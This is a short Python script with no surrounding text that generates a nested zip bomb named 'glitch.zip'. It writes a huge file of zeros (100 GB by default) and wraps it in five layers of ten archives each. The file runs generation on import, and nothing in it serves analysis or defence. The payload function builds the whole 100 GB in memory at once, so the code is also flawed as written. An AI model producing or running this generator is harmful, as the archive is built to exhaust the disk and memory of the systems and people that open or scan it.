import os
import zipfile

def create_payload(name, size_gb):
    with open(name, "wb") as f:
        f.write(b"0" * size_gb * 1024 * 1024 * 1024)

def generate_zip_bomb(final_name="glitch.zip", layers=5, files_per_layer=10, payload_size_gb=100):
    os.makedirs("tmp_bomb", exist_ok=True)
    os.chdir("tmp_bomb")
    
    create_payload("base.txt", payload_size_gb)

    prev_files = ["base.txt"]
    for i in range(layers):
        new_files = []
        for j in range(files_per_layer):
            zname = f"layer_{i}_{j}.zip"
            with zipfile.ZipFile(zname, "w", compression=zipfile.ZIP_DEFLATED) as zf:
                for f in prev_files:
                    zf.write(f, arcname=os.path.basename(f))
            new_files.append(zname)
        prev_files = new_files

    with zipfile.ZipFile(final_name, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        for f in prev_files:
            zf.write(f, arcname=os.path.basename(f))

    os.rename(final_name, f"../{final_name}")
    os.chdir("..")

generate_zip_bomb()
